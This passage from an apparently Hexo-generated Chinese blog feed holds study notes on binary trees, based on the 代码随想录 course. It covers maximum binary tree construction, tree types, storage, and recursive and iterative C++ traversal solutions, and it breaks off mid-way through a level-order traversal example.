<span class="hljs-keyword">return</span> node;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><ol type="1"><li><p>先要找到数组中最大的值和对应的下标，最大的值构造根节点，下标用来下一步分割数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> maxValue = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> maxValueIndex = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>    <span class="hljs-keyword">if</span> (nums[i] &gt; maxValue) &#123;<br>        maxValue = nums[i];<br>        maxValueIndex = i;<br>    &#125;<br>&#125;<br>TreeNode* node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(<span class="hljs-number">0</span>);<br>node-&gt;val = maxValue;<br></code></pre></td></tr></table></figure></li><li><p>最大值所在的下标左区间 构造左子树</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (maxValueIndex &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">newVec</span><span class="hljs-params">(nums.begin(), nums.begin() + maxValueIndex)</span></span>;<br>    node-&gt;left = <span class="hljs-built_in">constructMaximumBinaryTree</span>(newVec);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>最大值所在的下标右区间构造右子树</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (maxValueIndex &lt; (nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>)) &#123;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">newVec</span><span class="hljs-params">(nums.begin() + maxValueIndex + <span class="hljs-number">1</span>, nums.end())</span></span>;<br>    node-&gt;right = <span class="hljs-built_in">constructMaximumBinaryTree</span>(newVec);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">constructMaximumBinaryTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        TreeNode* node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>) &#123;<br>            node-&gt;val = nums[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">return</span> node;<br>        &#125;<br>        <span class="hljs-comment">// 找到数组中最大的值和对应的下标</span><br>        <span class="hljs-type">int</span> maxValue = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> maxValueIndex = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] &gt; maxValue) &#123;<br>                maxValue = nums[i];<br>                maxValueIndex = i;<br>            &#125;<br>        &#125;<br>        node-&gt;val = maxValue;<br>        <span class="hljs-comment">// 最大值所在的下标左区间 构造左子树</span><br>        <span class="hljs-keyword">if</span> (maxValueIndex &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">newVec</span><span class="hljs-params">(nums.begin(), nums.begin() + maxValueIndex)</span></span>;<br>            node-&gt;left = <span class="hljs-built_in">constructMaximumBinaryTree</span>(newVec);<br>        &#125;<br>        <span class="hljs-comment">// 最大值所在的下标右区间 构造右子树</span><br>        <span class="hljs-keyword">if</span> (maxValueIndex &lt; (nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>)) &#123;<br>            <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">newVec</span><span class="hljs-params">(nums.begin() + maxValueIndex + <span class="hljs-number">1</span>, nums.end())</span></span>;<br>            node-&gt;right = <span class="hljs-built_in">constructMaximumBinaryTree</span>(newVec);<br>        &#125;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>二叉树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树（一）</title>
    <link href="/2022/10/06/Algorithm/algorithm-6/"/>
    <url>/2022/10/06/Algorithm/algorithm-6/</url>
    
    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="二叉树理论基础篇">二叉树理论基础篇</h1><h2 id="二叉树的种类">二叉树的种类</h2><h3 id="满二叉树">满二叉树</h3><p>满二叉树：如果一棵二叉树只有度为0的结点和度为2的结点，并且度为0的结点在同一层上，则这棵二叉树为满二叉树。</p><span id="more"></span><h3 id="完全二叉树">完全二叉树</h3><p>完全二叉树的定义如下：在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第h 层，则该层包含 1~ 2^(h-1) 个节点。</p><h3 id="二叉搜索树">二叉搜索树</h3><p><strong>二叉搜索树是一个有序树</strong></p><ul><li>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li><li>若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</li><li>它的左、右子树也分别为二叉排序树</li></ul><h3 id="平衡二叉搜索树">平衡二叉搜索树</h3><p>平衡二叉搜索树：又被称为AVL（Adelson-Velsky andLandis）树，且具有以下性质：它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。</p><p><strong>C++中map、set、multimap，multiset的底层实现都是平衡二叉搜索树</strong>，所以map、set的增删操作时间时间复杂度是logn，注意我这里没有说unordered_map、unordered_set，unordered_map、unordered_map底层实现是哈希表。</p><h2 id="二叉树的存储方式">二叉树的存储方式</h2><h3 id="链式存储">链式存储</h3><h3 id="顺序存储">顺序存储</h3><p><strong>如果父节点的数组下标是 i，那么它的左孩子就是 i * 2 +1，右孩子就是 i * 2 + 2。</strong></p><h2 id="二叉树的遍历方式">二叉树的遍历方式</h2><ul><li>深度优先遍历<ul><li>前序遍历（递归法，迭代法）</li><li>中序遍历（递归法，迭代法）</li><li>后序遍历（递归法，迭代法）</li></ul></li><li>广度优先遍历<ul><li>层次遍历（迭代法）</li></ul></li></ul><h2 id="二叉树的定义">二叉树的定义</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> &#123;<br>    <span class="hljs-type">int</span> val;<br>    TreeNode *left;<br>    TreeNode *right;<br>    <span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">left</span>(<span class="hljs-literal">NULL</span>), <span class="hljs-built_in">right</span>(<span class="hljs-literal">NULL</span>) &#123;&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉树的递归遍历">二叉树的递归遍历</h1><p><strong>每次写递归，都按照这三要素来写，可以保证大家写出正确的递归算法！</strong></p><ol type="1"><li><p><strong>确定递归函数的参数和返回值：</strong>确定哪些参数是递归的过程中需要处理的，那么就在递归函数里加上这个参数，并且还要明确每次递归的返回值是什么进而确定递归函数的返回类型。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, vector&lt;<span class="hljs-type">int</span>&gt;&amp; vec)</span></span><br></code></pre></td></tr></table></figure></li><li><p><strong>确定终止条件：</strong> 写完了递归算法,运行的时候，经常会遇到栈溢出的错误，就是没写终止条件或者终止条件写的不对，操作系统也是用一个栈的结构来保存每一层递归的信息，如果递归没有终止，操作系统的内存栈必然就会溢出。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>确定单层递归的逻辑：</strong>确定每一层递归需要处理的信息。在这里也就会重复调用自己来实现递归的过程。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">vec.<span class="hljs-built_in">push_back</span>(cur-&gt;val);    <span class="hljs-comment">// 中</span><br><span class="hljs-built_in">traversal</span>(cur-&gt;left, vec);  <span class="hljs-comment">// 左</span><br><span class="hljs-built_in">traversal</span>(cur-&gt;right, vec); <span class="hljs-comment">// 右</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="前序遍历">前序遍历</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, vector&lt;<span class="hljs-type">int</span>&gt;&amp; vec)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>        vec.<span class="hljs-built_in">push_back</span>(cur-&gt;val);    <span class="hljs-comment">// 中</span><br>        <span class="hljs-built_in">traversal</span>(cur-&gt;left, vec);  <span class="hljs-comment">// 左</span><br>        <span class="hljs-built_in">traversal</span>(cur-&gt;right, vec); <span class="hljs-comment">// 右</span><br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-built_in">traversal</span>(root, result);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="中序遍历">中序遍历</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, vector&lt;<span class="hljs-type">int</span>&gt;&amp; vec)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">traversal</span>(cur-&gt;left, vec);  <span class="hljs-comment">// 左</span><br>    vec.<span class="hljs-built_in">push_back</span>(cur-&gt;val);    <span class="hljs-comment">// 中</span><br>    <span class="hljs-built_in">traversal</span>(cur-&gt;right, vec); <span class="hljs-comment">// 右</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="后序遍历">后序遍历</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, vector&lt;<span class="hljs-type">int</span>&gt;&amp; vec)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">traversal</span>(cur-&gt;left, vec);  <span class="hljs-comment">// 左</span><br>    <span class="hljs-built_in">traversal</span>(cur-&gt;right, vec); <span class="hljs-comment">// 右</span><br>    vec.<span class="hljs-built_in">push_back</span>(cur-&gt;val);    <span class="hljs-comment">// 中</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二叉树的迭代遍历">二叉树的迭代遍历</h1><h2 id="前序遍历迭代法">前序遍历（迭代法）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        stack&lt;TreeNode*&gt; st;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> result;<br>        st.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* node = st.<span class="hljs-built_in">top</span>();                       <span class="hljs-comment">// 中</span><br>            st.<span class="hljs-built_in">pop</span>();<br>            result.<span class="hljs-built_in">push_back</span>(node-&gt;val);<br>            <span class="hljs-keyword">if</span> (node-&gt;right) st.<span class="hljs-built_in">push</span>(node-&gt;right);           <span class="hljs-comment">// 右（空节点不入栈）</span><br>            <span class="hljs-keyword">if</span> (node-&gt;left) st.<span class="hljs-built_in">push</span>(node-&gt;left);             <span class="hljs-comment">// 左（空节点不入栈）</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="中序遍历-1">中序遍历</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        stack&lt;TreeNode*&gt; st;<br>        TreeNode* cur = root;<br>        <span class="hljs-keyword">while</span> (cur != <span class="hljs-literal">NULL</span> || !st.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (cur != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 指针来访问节点，访问到最底层</span><br>                st.<span class="hljs-built_in">push</span>(cur); <span class="hljs-comment">// 将访问的节点放进栈</span><br>                cur = cur-&gt;left;                <span class="hljs-comment">// 左</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cur = st.<span class="hljs-built_in">top</span>(); <span class="hljs-comment">// 从栈里弹出的数据，就是要处理的数据（放进result数组里的数据）</span><br>                st.<span class="hljs-built_in">pop</span>();<br>                result.<span class="hljs-built_in">push_back</span>(cur-&gt;val);     <span class="hljs-comment">// 中</span><br>                cur = cur-&gt;right;               <span class="hljs-comment">// 右</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="后序遍历迭代法">后序遍历（迭代法）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">postorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        stack&lt;TreeNode*&gt; st;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> result;<br>        st.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* node = st.<span class="hljs-built_in">top</span>();<br>            st.<span class="hljs-built_in">pop</span>();<br>            result.<span class="hljs-built_in">push_back</span>(node-&gt;val);<br>            <span class="hljs-keyword">if</span> (node-&gt;left) st.<span class="hljs-built_in">push</span>(node-&gt;left); <span class="hljs-comment">// 相对于前序遍历，这更改一下入栈顺序 （空节点不入栈）</span><br>            <span class="hljs-keyword">if</span> (node-&gt;right) st.<span class="hljs-built_in">push</span>(node-&gt;right); <span class="hljs-comment">// 空节点不入栈</span><br>        &#125;<br>        <span class="hljs-built_in">reverse</span>(result.<span class="hljs-built_in">begin</span>(), result.<span class="hljs-built_in">end</span>()); <span class="hljs-comment">// 将结果反转之后就是左右中的顺序了</span><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉树的统一迭代法">二叉树的统一迭代法</h1><p><strong>无法同时解决访问节点（遍历节点）和处理节点（将元素放进结果集）不一致的情况</strong>。</p><p><strong>那我们就将访问的节点放入栈中，把要处理的节点也放入栈中但是要做标记。</strong></p><p>如何标记呢，<strong>就是要处理的节点放入栈之后，紧接着放入一个空指针作为标记。</strong>这种方法也可以叫做标记法。</p><h2 id="迭代法中序遍历">迭代法中序遍历</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        stack&lt;TreeNode*&gt; st;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) st.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* node = st.<span class="hljs-built_in">top</span>();<br>            <span class="hljs-keyword">if</span> (node != <span class="hljs-literal">NULL</span>) &#123;<br>                st.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 将该节点弹出，避免重复操作，下面再将右中左节点添加到栈中</span><br>                <span class="hljs-keyword">if</span> (node-&gt;right) st.<span class="hljs-built_in">push</span>(node-&gt;right);  <span class="hljs-comment">// 添加右节点（空节点不入栈）</span><br><br>                st.<span class="hljs-built_in">push</span>(node);                          <span class="hljs-comment">// 添加中节点</span><br>                st.<span class="hljs-built_in">push</span>(<span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 中节点访问过，但是还没有处理，加入空节点做为标记。</span><br><br>                <span class="hljs-keyword">if</span> (node-&gt;left) st.<span class="hljs-built_in">push</span>(node-&gt;left);    <span class="hljs-comment">// 添加左节点（空节点不入栈）</span><br>            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 只有遇到空节点的时候，才将下一个节点放进结果集</span><br>                st.<span class="hljs-built_in">pop</span>();           <span class="hljs-comment">// 将空节点弹出</span><br>                node = st.<span class="hljs-built_in">top</span>();    <span class="hljs-comment">// 重新取出栈中元素</span><br>                st.<span class="hljs-built_in">pop</span>();<br>                result.<span class="hljs-built_in">push_back</span>(node-&gt;val); <span class="hljs-comment">// 加入到结果集</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="前序遍历-1">前序遍历</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        stack&lt;TreeNode*&gt; st;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) st.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* node = st.<span class="hljs-built_in">top</span>();<br>            <span class="hljs-keyword">if</span> (node != <span class="hljs-literal">NULL</span>) &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (node-&gt;right) st.<span class="hljs-built_in">push</span>(node-&gt;right);  <span class="hljs-comment">// 右</span><br>                <span class="hljs-keyword">if</span> (node-&gt;left) st.<span class="hljs-built_in">push</span>(node-&gt;left);    <span class="hljs-comment">// 左</span><br>                st.<span class="hljs-built_in">push</span>(node);                          <span class="hljs-comment">// 中</span><br>                st.<span class="hljs-built_in">push</span>(<span class="hljs-literal">NULL</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                node = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                result.<span class="hljs-built_in">push_back</span>(node-&gt;val);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="后序遍历-1">后序遍历</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">postorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        stack&lt;TreeNode*&gt; st;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) st.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* node = st.<span class="hljs-built_in">top</span>();<br>            <span class="hljs-keyword">if</span> (node != <span class="hljs-literal">NULL</span>) &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                st.<span class="hljs-built_in">push</span>(node);                          <span class="hljs-comment">// 中</span><br>                st.<span class="hljs-built_in">push</span>(<span class="hljs-literal">NULL</span>);<br><br>                <span class="hljs-keyword">if</span> (node-&gt;right) st.<span class="hljs-built_in">push</span>(node-&gt;right);  <span class="hljs-comment">// 右</span><br>                <span class="hljs-keyword">if</span> (node-&gt;left) st.<span class="hljs-built_in">push</span>(node-&gt;left);    <span class="hljs-comment">// 左</span><br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                node = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                result.<span class="hljs-built_in">push_back</span>(node-&gt;val);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉树的层序遍历">二叉树的层序遍历</h1><p><ahref="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102.二叉树的层序遍历 - 力扣（LeetCode）</a></p><p>需要借用一个辅助数据结构即队列来实现，<strong>队列先进先出，符合一层一层遍历的逻辑，而是用栈先进后出适合模拟深度优先遍历也就是递归的逻辑。</strong></p><p><strong>而这种层序遍历方式就是图论中的广度优先遍历，只不过我们应用在二叉树上。</strong></p><p>使用队列实现二叉树广度优先遍历，动画如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">levelOrder</span>(TreeNode* root) &#123;<br>        queue&lt;TreeNode*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(root);<br>        vector&lt;vector&lt;<span 